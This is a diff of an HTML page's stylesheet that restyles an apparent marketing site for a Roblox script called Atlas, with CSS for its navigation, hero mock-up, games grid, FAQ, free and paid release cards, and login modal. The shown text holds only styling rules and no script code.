@@ -3,147 +3,894 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Atlas UI</title>
+<title>Atlas | #1 Roblox Script</title>
+<link href="https://fonts.googleapis.com/css2?family=Rajdhani:wght@400;500;600;700&family=Exo+2:wght@300;400;600;700;800;900&display=swap" rel="stylesheet">
 <style>
-body {
-  margin: 0;
-  font-family: 'Segoe UI', sans-serif;
-  background-color: #0a0a0f;
-  color: #fff;
+*{margin:0;padding:0;box-sizing:border-box}
+:root{
+--blue:#1e90ff;
+--blue-bright:#4dabff;
+--blue-dim:#0a4f99;
+--bg:#030d1a;
+--panel-border:#162b44;
+--text:#c8dff0;
+--text-dim:#4a7fa5;
+--text-mid:#7aaccc;
 }
-.container {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  padding: 50px 20px;
-}
-.header {
-  text-align: center;
-  margin-bottom: 50px;
-}
-.header .cheat {
-  font-size: 14px;
-  color: #3399ff;
-  text-transform: uppercase;
-  letter-spacing: 1px;
-}
-.header h1 {
-  font-size: 48px;
-  margin: 10px 0;
-}
-.header h2 {
-  font-size: 32px;
-  color: #fff;
-}
-.header .features {
-  margin-top: 15px;
-  font-size: 12px;
-  color: #3399ff;
-}
-.header .features span {
-  margin: 0 5px;
-}
-.tabs {
-  display: flex;
-  gap: 20px;
-  justify-content: center;
-  margin-bottom: 30px;
-}
-.tab {
-  padding: 10px 20px;
-  cursor: pointer;
-  background-color: #111119;
-  border-radius: 6px;
-  transition: 0.3s;
-}
-.tab.active, .tab:hover {
-  background-color: #1a1a2e;
-}
-.content {
-  width: 100%;
-  max-width: 900px;
-  min-height: 400px;
-  display: flex;
-  flex-direction: column;
-  gap: 20px;
-}
-.ui-panel {
-  width: 100%;
-  background-color: #111119;
-  border-radius: 12px;
-  padding: 20px;
-  transition: background-color 0.3s, transform 0.3s;
-  cursor: pointer;
-  display: none;
-  flex-direction: column;
-  align-items: center;
-}
-.ui-panel.active {
-  display: flex;
-}
-.ui-panel:hover {
-  background-color: #1a1a2e;
-  transform: scale(1.01);
-}
-.ui-panel img {
-  max-width: 100%;
-  border-radius: 8px;
-  transition: transform 0.3s ease;
-}
-.ui-panel img:hover {
-  transform: scale(1.02);
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:'Exo 2',sans-serif;min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(30,144,255,0.035) 1px,transparent 1px),linear-gradient(90deg,rgba(30,144,255,0.035) 1px,transparent 1px);background-size:52px 52px;pointer-events:none;z-index:0}
+body::after{content:'';position:fixed;inset:0;background:radial-gradient(ellipse at 25% 35%,rgba(30,144,255,0.08) 0%,transparent 55%),radial-gradient(ellipse at 85% 75%,rgba(0,70,160,0.06) 0%,transparent 50%);pointer-events:none;z-index:0}
+
+nav{position:fixed;top:0;left:0;right:0;z-index:100;display:flex;align-items:center;justify-content:space-between;padding:16px 64px;background:rgba(3,13,26,0.92);backdrop-filter:blur(16px);border-bottom:1px solid rgba(30,144,255,0.1)}
+.nav-logo{font-family:'Rajdhani',sans-serif;font-size:1.55rem;font-weight:700;letter-spacing:0.18em;color:#fff;text-transform:uppercase;display:flex;align-items:center;gap:10px;user-select:none;cursor:pointer}
+.nav-logo-mark{width:20px;height:20px;border:2px solid var(--blue);transform:rotate(45deg);box-shadow:0 0 10px rgba(30,144,255,0.4);flex-shrink:0}
+.nav-center{display:flex;gap:4px}
+.nav-right{display:flex;align-items:center;gap:10px}
+.nav-link{background:transparent;border:none;color:var(--text-dim);font-family:'Exo 2',sans-serif;font-size:0.8rem;font-weight:600;letter-spacing:0.12em;text-transform:uppercase;padding:9px 18px;cursor:pointer;border-radius:4px;transition:color 0.25s;position:relative}
+.nav-link::after{content:'';position:absolute;bottom:5px;left:50%;transform:translateX(-50%);width:0;height:1.5px;background:var(--blue);border-radius:2px;transition:width 0.3s cubic-bezier(0.4,0,0.2,1)}
+.nav-link:hover{color:var(--text)}
+.nav-link:hover::after,.nav-link.active::after{width:50%}
+.nav-link.active{color:var(--blue)}
+.nav-link.special{color:#f0b429}
+.nav-link.special::after{background:#f0b429}
+.nav-link.special:hover{color:#ffd060}
+.nav-btn-small{background:transparent;border:1px solid rgba(30,144,255,0.3);color:var(--blue);font-family:'Exo 2',sans-serif;font-size:0.72rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;padding:7px 18px;border-radius:4px;cursor:pointer;transition:all 0.22s}
+.nav-btn-small:hover{background:rgba(30,144,255,0.08);border-color:rgba(30,144,255,0.6)}
+.nav-user-chip{display:flex;align-items:center;gap:8px;background:rgba(30,144,255,0.07);border:1px solid rgba(30,144,255,0.2);border-radius:4px;padding:6px 14px}
+.nav-user-name{font-size:0.75rem;font-weight:700;letter-spacing:0.08em;color:var(--blue-bright)}
+.nav-user-logout{background:transparent;border:none;color:var(--text-dim);font-size:0.65rem;cursor:pointer;letter-spacing:0.08em;text-transform:uppercase;transition:color 0.2s;padding:0;font-family:'Exo 2',sans-serif}
+.nav-user-logout:hover{color:#ff6b6b}
+
+.page{display:none;position:relative;z-index:1;min-height:100vh}
+.page.active{display:block}
+
+.hero{min-height:100vh;display:flex;align-items:center;padding:0 64px;gap:80px}
+.hero-left{flex:1;max-width:580px}
+.hero-badge{display:inline-flex;align-items:center;gap:9px;background:rgba(30,144,255,0.07);border:1px solid rgba(30,144,255,0.22);border-radius:3px;padding:7px 16px;font-size:0.68rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--blue);margin-bottom:30px}
+.badge-dot{width:5px;height:5px;border-radius:50%;background:var(--blue);box-shadow:0 0 8px var(--blue);animation:blink 2s ease-in-out infinite}
+@keyframes blink{0%,100%{opacity:1}50%{opacity:0.3}}
+.hero-title{font-family:'Rajdhani',sans-serif;font-size:clamp(3.2rem,6.5vw,6rem);font-weight:700;line-height:0.9;text-transform:uppercase;color:var(--blue);filter:drop-shadow(0 0 28px rgba(30,144,255,0.45));margin-bottom:4px}
+.hero-subtitle{font-family:'Rajdhani',sans-serif;font-size:clamp(3rem,6vw,5.6rem);font-weight:700;line-height:0.9;text-transform:uppercase;color:#fff;margin-bottom:32px}
+.hero-name-row{display:flex;align-items:center;gap:14px;margin-bottom:38px}
+.hero-name-bar{width:3px;height:30px;background:linear-gradient(180deg,var(--blue),rgba(30,144,255,0.2));border-radius:2px;flex-shrink:0}
+.hero-name-text{font-family:'Rajdhani',sans-serif;font-size:1.35rem;font-weight:600;letter-spacing:0.22em;text-transform:uppercase;color:var(--text-mid)}
+.hero-tags{display:flex;background:rgba(8,18,32,0.8);border:1px solid rgba(30,144,255,0.15);border-radius:5px;overflow:hidden;width:fit-content;margin-bottom:44px}
+.hero-tag{padding:10px 22px;font-size:0.68rem;font-weight:700;letter-spacing:0.13em;text-transform:uppercase;color:var(--text-dim);position:relative;transition:color 0.25s}
+.hero-tag:hover{color:var(--text)}
+.hero-tag:not(:last-child)::after{content:'';position:absolute;right:0;top:30%;bottom:30%;width:1px;background:rgba(30,144,255,0.15)}
+.hero-cta{display:flex;gap:14px}
+.btn-primary{background:var(--blue);color:#fff;border:none;padding:14px 38px;font-family:'Exo 2',sans-serif;font-size:0.78rem;font-weight:800;letter-spacing:0.14em;text-transform:uppercase;border-radius:4px;cursor:pointer;transition:transform 0.22s,box-shadow 0.22s,background 0.22s;box-shadow:0 0 22px rgba(30,144,255,0.25);position:relative;overflow:hidden}
+.btn-primary::before{content:'';position:absolute;inset:0;background:linear-gradient(135deg,rgba(255,255,255,0.12) 0%,transparent 60%);opacity:0;transition:opacity 0.22s}
+.btn-primary:hover{transform:translateY(-3px);box-shadow:0 8px 32px rgba(30,144,255,0.45);background:#2e9fff}
+.btn-primary:hover::before{opacity:1}
+.btn-secondary{background:transparent;color:var(--blue);border:1px solid rgba(30,144,255,0.3);padding:14px 38px;font-family:'Exo 2',sans-serif;font-size:0.78rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;border-radius:4px;cursor:pointer;transition:all 0.22s}
+.btn-secondary:hover{background:rgba(30,144,255,0.07);border-color:rgba(30,144,255,0.55);transform:translateY(-3px);color:var(--blue-bright)}
+
+.hero-right{flex:1;display:flex;justify-content:center;align-items:center}
+.ui-wrapper{position:relative;width:470px}
+.ui-outer-glow{position:absolute;inset:-40px;background:radial-gradient(ellipse,rgba(30,144,255,0.12) 0%,transparent 68%);pointer-events:none;border-radius:24px}
+.corner-dec{position:absolute;width:16px;height:16px;border-color:rgba(30,144,255,0.5);border-style:solid;transition:border-color 0.4s,width 0.3s,height 0.3s;z-index:2}
+.ui-wrapper:hover .corner-dec{border-color:var(--blue);width:20px;height:20px}
+.corner-dec.tl{top:-5px;left:-5px;border-width:2px 0 0 2px}
+.corner-dec.tr{top:-5px;right:-5px;border-width:2px 2px 0 0}
+.corner-dec.bl{bottom:-5px;left:-5px;border-width:0 0 2px 2px}
+.corner-dec.br{bottom:-5px;right:-5px;border-width:0 2px 2px 0}
+.scan-line{position:absolute;left:0;right:0;height:1.5px;background:linear-gradient(90deg,transparent 0%,rgba(30,144,255,0.7) 40%,rgba(30,144,255,0.9) 50%,rgba(30,144,255,0.7) 60%,transparent 100%);top:0;animation:scan 3.5s linear infinite;opacity:0;pointer-events:none;z-index:3;transition:opacity 0.5s}
+.ui-wrapper:hover .scan-line{opacity:1}
+@keyframes scan{0%{top:0%}100%{top:100%}}
+.atlas-ui{background:rgba(8,16,28,0.97);border:1px solid rgba(30,144,255,0.35);border-radius:7px;overflow:hidden;box-shadow:0 0 40px rgba(30,144,255,0.12),inset 0 1px 0 rgba(255,255,255,0.04);transition:transform 0.4s cubic-bezier(0.4,0,0.2,1),box-shadow 0.4s,border-color 0.4s}
+.ui-wrapper:hover .atlas-ui{transform:translateY(-8px) scale(1.012);box-shadow:0 24px 80px rgba(30,144,255,0.28),inset 0 1px 0 rgba(255,255,255,0.07);border-color:rgba(30,144,255,0.6)}
+.ui-titlebar{display:flex;align-items:center;justify-content:space-between;padding:8px 14px;background:rgba(4,10,20,0.95);border-bottom:1px solid rgba(30,144,255,0.12)}
+.ui-tabs-top{display:flex;gap:3px}
+.ui-tab-top{font-size:0.7rem;font-weight:600;letter-spacing:0.07em;padding:3px 11px;border-radius:3px;color:var(--text-dim);cursor:pointer;transition:all 0.2s}
+.ui-tab-top.t-blue{color:var(--blue);background:rgba(30,144,255,0.08)}
+.ui-tab-top.t-gold{color:#f0b429;background:rgba(240,180,41,0.08)}
+.ui-version{font-size:0.6rem;color:var(--text-dim);letter-spacing:0.1em}
+.ui-nav{display:flex;padding:5px 9px;gap:1px;border-bottom:1px solid rgba(255,255,255,0.05)}
+.ui-nav-btn{font-size:0.67rem;font-weight:600;letter-spacing:0.07em;padding:4px 11px;border-radius:3px;color:var(--text-dim);cursor:pointer;transition:all 0.2s}
+.ui-nav-btn:hover{color:var(--text-mid);background:rgba(255,255,255,0.03)}
+.ui-nav-btn.active{color:#fff;background:rgba(255,255,255,0.07)}
+.ui-body{display:grid;grid-template-columns:1fr 1fr;gap:14px;padding:14px}
+.ui-section-title{font-size:0.65rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--text-mid);margin-bottom:9px}
+.ui-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;cursor:pointer;border-radius:3px;padding:2px 4px;transition:background 0.2s}
+.ui-row:hover{background:rgba(30,144,255,0.05)}
+.ui-checkbox{width:11px;height:11px;border:1px solid rgba(255,255,255,0.18);border-radius:2px;flex-shrink:0;position:relative;transition:all 0.3s}
+.ui-checkbox.on{border-color:var(--blue);background:rgba(30,144,255,0.18)}
+.ui-checkbox.on::after{content:'';position:absolute;top:2px;left:2px;right:2px;bottom:2px;background:var(--blue);border-radius:1px}
+.ui-label{font-size:0.66rem;color:var(--text-dim);transition:color 0.25s;letter-spacing:0.03em}
+.ui-row:hover .ui-label{color:var(--text)}
+.ui-label.blue{color:var(--blue)}
+.ui-slider-block{margin-bottom:9px}
+.ui-slider-label{font-size:0.62rem;color:var(--text-dim);margin-bottom:5px;letter-spacing:0.05em}
+.ui-track{width:100%;height:3px;background:rgba(255,255,255,0.07);border-radius:2px;position:relative;cursor:pointer;transition:background 0.2s}
+.ui-track:hover{background:rgba(255,255,255,0.12)}
+.ui-fill{height:100%;background:linear-gradient(90deg,var(--blue-dim),var(--blue));border-radius:2px;position:relative;transition:filter 0.3s}
+.ui-wrapper:hover .ui-fill{filter:drop-shadow(0 0 3px rgba(30,144,255,0.7))}
+.ui-fill::after{content:'';position:absolute;right:-4px;top:50%;transform:translateY(-50%);width:8px;height:8px;background:var(--blue-bright);border-radius:50%;border:1.5px solid rgba(255,255,255,0.25);box-shadow:0 0 6px rgba(30,144,255,0.6);transition:transform 0.2s}
+.ui-track:hover .ui-fill::after{transform:translateY(-50%) scale(1.3)}
+.ui-select{background:rgba(0,0,0,0.3);border:1px solid rgba(255,255,255,0.08);border-radius:3px;padding:4px 9px;font-size:0.62rem;color:var(--text-dim);display:flex;justify-content:space-between;align-items:center;margin-bottom:7px;cursor:pointer;transition:border-color 0.2s,background 0.2s,color 0.2s}
+.ui-select:hover{border-color:rgba(30,144,255,0.35);background:rgba(30,144,255,0.04);color:var(--text-mid)}
+.ui-select::after{content:'v';opacity:0.4;font-size:0.55rem}
+.ui-hr{border:none;border-top:1px solid rgba(255,255,255,0.05);margin:9px 0}
+
+.content-page{padding:100px 64px 72px;position:relative;z-index:1;min-height:100vh}
+.page-eyebrow{font-size:0.68rem;font-weight:700;letter-spacing:0.22em;text-transform:uppercase;color:var(--blue);margin-bottom:12px;display:flex;align-items:center;gap:12px}
+.page-eyebrow::before{content:'';display:block;width:28px;height:1px;background:var(--blue);flex-shrink:0}
+.page-title{font-family:'Rajdhani',sans-serif;font-size:clamp(2rem,4vw,3.8rem);font-weight:700;text-transform:uppercase;letter-spacing:0.04em;color:#fff;line-height:1;margin-bottom:56px}
+.page-title span{color:var(--blue)}
+
+.info-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(285px,1fr));gap:18px;max-width:1020px}
+.info-card{background:rgba(8,18,32,0.7);border:1px solid var(--panel-border);border-radius:7px;padding:30px 26px;transition:border-color 0.35s,background 0.35s,transform 0.3s,box-shadow 0.3s;position:relative;overflow:hidden;cursor:default}
+.info-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px;background:linear-gradient(90deg,transparent,var(--blue),transparent);transform:translateX(-110%);transition:transform 0.55s cubic-bezier(0.4,0,0.2,1)}
+.info-card:hover{border-color:rgba(30,144,255,0.28);background:rgba(12,28,50,0.88);transform:translateY(-4px);box-shadow:0 12px 40px rgba(30,144,255,0.12)}
+.info-card:hover::before{transform:translateX(0)}
+.info-card-icon{width:38px;height:38px;background:rgba(30,144,255,0.09);border:1px solid rgba(30,144,255,0.2);border-radius:6px;display:flex;align-items:center;justify-content:center;margin-bottom:18px;transition:background 0.3s,border-color 0.3s}
+.info-card:hover .info-card-icon{background:rgba(30,144,255,0.16);border-color:rgba(30,144,255,0.38)}
+.info-card-icon svg{width:18px;height:18px;stroke:var(--blue);fill:none;stroke-width:1.8;stroke-linecap:round;stroke-linejoin:round;transition:stroke 0.3s}
+.info-card:hover .info-card-icon svg{stroke:var(--blue-bright)}
+.info-card-title{font-family:'Rajdhani',sans-serif;font-size:1.15rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:#fff;margin-bottom:10px;transition:color 0.3s}
+.info-card:hover .info-card-title{color:var(--blue-bright)}
+.info-card-text{font-size:0.83rem;color:var(--text-dim);line-height:1.75;transition:color 0.3s}
+.info-card:hover .info-card-text{color:var(--text-mid)}
+
+.games-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(260px,1fr));gap:20px;max-width:1200px}
+.game-card{background:rgba(8,18,32,0.7);border:1px solid var(--panel-border);border-radius:8px;overflow:hidden;transition:border-color 0.35s,background 0.35s,transform 0.35s,box-shadow 0.35s;cursor:default;position:relative}
+.game-card:hover{border-color:rgba(30,144,255,0.35);background:rgba(12,26,48,0.92);transform:translateY(-6px) scale(1.01);box-shadow:0 16px 48px rgba(30,144,255,0.15)}
+.game-thumb-wrap{position:relative;height:160px;overflow:hidden}
+.game-thumb{width:100%;height:100%;object-fit:cover;display:block;filter:brightness(0.72) saturate(0.8);transition:filter 0.45s,transform 0.45s}
+.game-card:hover .game-thumb{filter:brightness(0.88) saturate(1.15);transform:scale(1.05)}
+.game-overlay{position:absolute;inset:0;background:linear-gradient(180deg,transparent 45%,rgba(8,18,32,0.98) 100%);pointer-events:none}
+.game-body{padding:16px 20px 20px}
+.game-tag-row{display:flex;align-items:center;gap:8px;margin-bottom:8px}
+.game-tag{font-size:0.6rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--blue);background:rgba(30,144,255,0.1);border:1px solid rgba(30,144,255,0.2);border-radius:3px;padding:2px 8px;transition:background 0.3s,border-color 0.3s,color 0.3s}
+.game-card:hover .game-tag{background:rgba(30,144,255,0.18);border-color:rgba(30,144,255,0.4);color:var(--blue-bright)}
+.game-tag.beta{color:#f0b429;background:rgba(240,180,41,0.08);border-color:rgba(240,180,41,0.2)}
+.game-card:hover .game-tag.beta{background:rgba(240,180,41,0.15);border-color:rgba(240,180,41,0.4)}
+.game-name{font-family:'Rajdhani',sans-serif;font-size:1.25rem;font-weight:700;text-transform:uppercase;letter-spacing:0.07em;color:#fff;margin-bottom:6px;transition:color 0.3s}
+.game-card:hover .game-name{color:var(--blue-bright)}
+.game-desc{font-size:0.78rem;color:var(--text-dim);line-height:1.65;transition:color 0.3s}
+.game-card:hover .game-desc{color:var(--text-mid)}
+
+.faq-list{max-width:880px;display:flex;flex-direction:column;gap:10px}
+.faq-item{background:rgba(8,18,32,0.7);border:1px solid var(--panel-border);border-radius:6px;overflow:hidden;transition:border-color 0.3s,background 0.3s}
+.faq-item:hover{border-color:rgba(30,144,255,0.22);background:rgba(10,24,44,0.82)}
+.faq-item.open{border-color:rgba(30,144,255,0.3);background:rgba(10,24,44,0.88)}
+.faq-q{display:flex;align-items:center;justify-content:space-between;padding:18px 26px;cursor:pointer;font-weight:600;font-size:0.9rem;color:var(--text);letter-spacing:0.025em;transition:color 0.25s;gap:16px}
+.faq-q:hover{color:#fff}
+.faq-item.open .faq-q{color:var(--blue-bright)}
+.faq-arrow{width:18px;height:18px;border:1px solid rgba(30,144,255,0.3);border-radius:3px;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:background 0.25s,border-color 0.25s,transform 0.3s;font-size:0.75rem;color:var(--blue)}
+.faq-item.open .faq-arrow{transform:rotate(45deg);background:rgba(30,144,255,0.12);border-color:var(--blue)}
+.faq-body{max-height:0;overflow:hidden;transition:max-height 0.4s cubic-bezier(0.4,0,0.2,1)}
+.faq-body-inner{padding:16px 26px 20px;font-size:0.85rem;color:var(--text-dim);line-height:1.8;border-top:1px solid rgba(255,255,255,0.05);transition:color 0.3s}
+.faq-item.open .faq-body-inner{color:var(--text-mid)}
+.faq-item.open .faq-body{max-height:260px}
+
+.releases-grid{display:flex;flex-direction:column;gap:16px;max-width:780px}
+.release-card{background:rgba(8,18,32,0.7);border:1px solid var(--panel-border);border-radius:8px;padding:28px 30px;display:flex;align-items:center;justify-content:space-between;gap:24px;transition:border-color 0.35s,background 0.35s,transform 0.3s,box-shadow 0.3s;position:relative;overflow:hidden}
+.release-card::before{content:'';position:absolute;top:0;left:0;right:0;height:1.5px;background:linear-gradient(90deg,transparent,var(--blue),transparent);transform:translateX(-110%);transition:transform 0.55s cubic-bezier(0.4,0,0.2,1)}
+.release-card:hover{border-color:rgba(30,144,255,0.3);background:rgba(10,24,44,0.88);transform:translateY(-3px);box-shadow:0 10px 36px rgba(30,144,255,0.12)}
+.release-card:hover::before{transform:translateX(0)}
+.release-card.paid-card::before{background:linear-gradient(90deg,transparent,#f0b429,transparent)}
+.release-card.paid-card:hover{border-color:rgba(240,180,41,0.3);box-shadow:0 10px 36px rgba(240,180,41,0.08)}
+.release-left{flex:1}
+.release-badge-row{display:flex;align-items:center;gap:8px;margin-bottom:10px}
+.release-badge{font-size:0.6rem;font-weight:800;letter-spacing:0.16em;text-transform:uppercase;padding:3px 10px;border-radius:3px;border:1px solid}
+.release-badge.free{color:#3ddc84;background:rgba(61,220,132,0.08);border-color:rgba(61,220,132,0.25)}
+.release-badge.paid{color:#f0b429;background:rgba(240,180,41,0.08);border-color:rgba(240,180,41,0.25)}
+.release-version{font-size:0.65rem;color:var(--text-dim);letter-spacing:0.1em}
+.release-title{font-family:'Rajdhani',sans-serif;font-size:1.3rem;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#fff;margin-bottom:8px;transition:color 0.3s}
+.release-card:hover .release-title{color:var(--blue-bright)}
+.release-card.paid-card:hover .release-title{color:#ffd060}
+.release-desc{font-size:0.82rem;color:var(--text-dim);line-height:1.7;transition:color 0.3s}
+.release-card:hover .release-desc{color:var(--text-mid)}
+.release-btn{flex-shrink:0;padding:11px 26px;font-family:'Exo 2',sans-serif;font-size:0.72rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;border-radius:4px;cursor:pointer;transition:all 0.22s;text-decoration:none;display:inline-flex;align-items:center;gap:7px;white-space:nowrap}
+.release-btn.btn-free{background:rgba(61,220,132,0.1);border:1px solid rgba(61,220,132,0.35);color:#3ddc84}
+.release-btn.btn-free:hover{background:rgba(61,220,132,0.2);border-color:rgba(61,220,132,0.6);transform:translateY(-2px)}
+.release-btn.btn-paid{background:rgba(240,180,41,0.1);border:1px solid rgba(240,180,41,0.35);color:#f0b429}
+.release-btn.btn-paid:hover{background:rgba(240,180,41,0.2);border-color:rgba(240,180,41,0.6);transform:translateY(-2px)}
+.releases-empty{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:45vh;text-align:center}
+.releases-empty-ring{width:80px;height:80px;border:2px solid rgba(30,144,255,0.15);border-radius:50%;display:flex;align-items:center;justify-content:center;margin-bottom:24px;position:relative}
+.releases-empty-ring::before{content:'';position:absolute;inset:-8px;border:1px solid rgba(30,144,255,0.07);border-radius:50%}
+.releases-empty-ring svg{width:28px;height:28px;stroke:rgba(30,144,255,0.35);fill:none;stroke-width:1.5;stroke-linecap:round;stroke-linejoin:round}
+.releases-empty-title{font-family:'Rajdhani',sans-serif;font-size:1.6rem;font-weight:700;text-transform:uppercase;letter-spacing:0.12em;color:var(--text-dim);margin-bottom:8px}
+.releases-empty-sub{font-size:0.82rem;color:rgba(74,127,165,0.6);letter-spacing:0.05em}
+
+.modal-overlay{position:fixed;inset:0;background:rgba(0,0,0,0.7);backdrop-filter:blur(6px);z-index:200;display:flex;align-items:center;justify-content:center;opacity:0;pointer-events:none;transition:opacity 0.3s}
+.modal-overlay.open{opacity:1;pointer-events:all}
+.modal{background:#060f1d;border:1px solid rgba(30,144,255,0.25);border-radius:10px;padding:40px;width:100%;max-width:420px;position:relative;transform:translateY(20px);transition:transform 0.3s}
+.modal-overlay.open .modal{transform:translateY(0)}
+.modal-title{font-family:'Rajdhani',sans-serif;font-size:1.8rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:#fff;margin-bottom:4px}
+.modal-sub{font-size:0.78rem;color:var(--text-dim);margin-bottom:30px;letter-spacing:0.02em}
+.modal-sub span{color:var(--blue);cursor:pointer;font-weight:600}
+.modal-sub span:hover{color:var(--blue-bright)}
+.modal-close{position:absolute;top:16px;right:18px;background:transparent;border:none;color:var(--text-dim);font-size:1.2rem;cursor:pointer;transition:color 0.2s;line-height:1}
+.modal-close:hover{color:#fff}
+.field{margin-bottom:18px}
+.field-label{font-size:0.68rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:var(--text-mid);margin-bottom:8px;display:block}
+.field-input{width:100%;background:rgba(255,255,255,0.04);border:1px solid rgba(30,144,255,0.18);border-radius:4px;padding:11px 14px;font-family:'Exo 2',sans-serif;font-size:0.85rem;color:#fff;outline:none;transition:border-color 0.2s,background 0.2s}
+.field-input:focus{border-color:rgba(30,144,255,0.5);background:rgba(30,144,255,0.04)}
+.field-input::placeholder{color:rgba(74,127,165,0.5)}
+.field-optional{font-size:0.6rem;color:rgba(74,127,165,0.5);margin-left:6px;font-weight:400;letter-spacing:0.05em;text-transform:none}
+.modal-btn{width:100%;padding:13px;background:var(--blue);color:#fff;border:none;font-family:'Exo 2',sans-serif;font-size:0.82rem;font-weight:800;letter-spacing:0.14em;text-transform:uppercase;border-radius:4px;cursor:pointer;transition:background 0.22s,transform 0.22s,box-shadow 0.22s;margin-top:4px}
+.modal-btn:hover{background:#2e9fff;transform:translateY(-2px);box-shadow:0 6px 24px rgba(30,144,255,0.35)}
+.modal-msg{font-size:0.78rem;margin-top:14px;text-align:center;min-height:20px;letter-spacing:0.02em}
+.modal-msg.ok{color:#3ddc84}
+.modal-msg.err{color:#ff6b6b}
+
+.webbase-page{padding:100px 64px 72px;position:relative;z-index:1;min-height:100vh}
+.webbase-header{margin-bottom:48px}
+.webbase-status-row{display:flex;align-items:center;gap:12px;margin-bottom:16px}
+.status-chip{display:inline-flex;align-items:center;gap:7px;background:rgba(61,220,132,0.07);border:1px solid rgba(61,220,132,0.2);border-radius:3px;padding:5px 14px;font-size:0.67rem;font-weight:700;letter-spacing:0.12em;text-transform:uppercase;color:#3ddc84}
+.status-chip-dot{width:5px;height:5px;border-radius:50%;background:#3ddc84;box-shadow:0 0 6px #3ddc84;animation:blink 2s infinite}
+.webbase-layout{display:grid;grid-template-columns:260px 1fr;gap:20px;height:calc(100vh - 280px);min-height:500px}
+.wb-sidebar{background:rgba(8,18,32,0.8);border:1px solid var(--panel-border);border-radius:8px;padding:20px;display:flex;flex-direction:column;gap:6px;transition:border-color 0.3s}
+.wb-sidebar:hover{border-color:rgba(30,144,255,0.2)}
+.wb-sidebar-title{font-size:0.62rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--text-dim);margin-bottom:8px;padding:0 4px}
+.wb-nav-item{padding:9px 12px;border-radius:4px;font-size:0.78rem;font-weight:600;color:var(--text-dim);cursor:pointer;transition:background 0.2s,color 0.2s;letter-spacing:0.04em;display:flex;align-items:center;gap:9px}
+.wb-nav-item:hover{background:rgba(30,144,255,0.06);color:var(--text-mid)}
+.wb-nav-item.active{background:rgba(30,144,255,0.1);color:var(--blue-bright);border:1px solid rgba(30,144,255,0.15)}
+.wb-nav-item svg{width:13px;height:13px;stroke:currentColor;fill:none;stroke-width:2;stroke-linecap:round;stroke-linejoin:round;flex-shrink:0}
+.wb-main{background:rgba(8,18,32,0.8);border:1px solid var(--panel-border);border-radius:8px;overflow:hidden;display:flex;flex-direction:column;transition:border-color 0.3s}
+.wb-main:hover{border-color:rgba(30,144,255,0.2)}
+.wb-main-bar{padding:12px 20px;background:rgba(4,10,20,0.6);border-bottom:1px solid rgba(30,144,255,0.08);display:flex;align-items:center;justify-content:space-between}
+.wb-main-title{font-family:'Rajdhani',sans-serif;font-size:1rem;font-weight:700;text-transform:uppercase;letter-spacing:0.1em;color:#fff}
+.wb-connect-btn{padding:7px 18px;background:rgba(30,144,255,0.1);border:1px solid rgba(30,144,255,0.3);border-radius:3px;font-family:'Exo 2',sans-serif;font-size:0.68rem;font-weight:700;letter-spacing:0.1em;text-transform:uppercase;color:var(--blue);cursor:pointer;transition:all 0.22s}
+.wb-connect-btn:hover{background:rgba(30,144,255,0.18);border-color:rgba(30,144,255,0.5)}
+.wb-content{flex:1;padding:24px;overflow-y:auto;display:flex;flex-direction:column;gap:16px}
+.wb-section-label{font-size:0.62rem;font-weight:700;letter-spacing:0.14em;text-transform:uppercase;color:var(--text-dim);margin-bottom:2px}
+.wb-grid{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.wb-toggle-row{display:flex;align-items:center;justify-content:space-between;background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:5px;padding:10px 14px;transition:background 0.2s,border-color 0.2s;cursor:pointer}
+.wb-toggle-row:hover{background:rgba(30,144,255,0.05);border-color:rgba(30,144,255,0.15)}
+.wb-toggle-label{font-size:0.76rem;font-weight:600;color:var(--text);letter-spacing:0.03em}
+.wb-toggle{width:32px;height:16px;background:rgba(255,255,255,0.1);border-radius:8px;position:relative;transition:background 0.25s;flex-shrink:0}
+.wb-toggle.on{background:rgba(30,144,255,0.5)}
+.wb-toggle::after{content:'';position:absolute;top:2px;left:2px;width:12px;height:12px;background:#fff;border-radius:50%;transition:transform 0.25s,background 0.25s;box-shadow:0 1px 3px rgba(0,0,0,0.3)}
+.wb-toggle.on::after{transform:translateX(16px);background:var(--blue-bright)}
+.wb-slider-wrap{background:rgba(255,255,255,0.03);border:1px solid rgba(255,255,255,0.06);border-radius:5px;padding:12px 14px;transition:background 0.2s,border-color 0.2s}
+.wb-slider-wrap:hover{background:rgba(30,144,255,0.04);border-color:rgba(30,144,255,0.12)}
+.wb-slider-top{display:flex;justify-content:space-between;margin-bottom:10px}
+.wb-slider-name{font-size:0.75rem;font-weight:600;color:var(--text);letter-spacing:0.03em}
+.wb-slider-val{font-size:0.7rem;color:var(--blue);font-weight:700}
+.wb-slider-track{width:100%;height:4px;background:rgba(255,255,255,0.08);border-radius:2px;cursor:pointer;position:relative}
+.wb-slider-fill{height:100%;background:linear-gradient(90deg,var(--blue-dim),var(--blue));border-radius:2px;position:relative}
+.wb-slider-fill::after{content:'';position:absolute;right:-5px;top:50%;transform:translateY(-50%);width:10px;height:10px;background:var(--blue-bright);border-radius:50%;border:2px solid rgba(255,255,255,0.2);box-shadow:0 0 6px rgba(30,144,255,0.5)}
